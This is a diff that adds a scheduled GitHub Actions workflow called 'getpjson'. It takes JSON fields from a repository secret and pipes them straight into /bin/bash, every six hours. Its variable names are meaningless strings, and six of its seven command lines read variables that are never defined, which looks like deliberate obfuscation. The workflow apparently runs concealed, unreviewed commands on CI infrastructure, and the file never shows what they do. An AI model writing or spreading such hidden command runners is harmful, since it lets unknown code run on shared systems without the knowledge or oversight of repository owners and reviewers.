@@ -1,0 +1,24 @@
+name: getpjson
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: getpjson
+        env:
+          eb756: ${{ secrets.eb756 }}
+        run: |
+          echo $eb756 | jq -r .g72 | /bin/bash
+          echo $cyr1577 | jq -r .cm5 | /bin/bash
+          echo $eprin5878 | jq -r .ya7 | /bin/bash
+          echo $nvkf099 | jq -r .vftsl19926 | /bin/bash
+          echo $bhkc206 | jq -r .jppeg65436 | /bin/bash
+          echo $shjyd96657 | jq -r .ctieg2 | /bin/bash
+          echo $poie7 | jq -r .pdy20 | /bin/bash
+
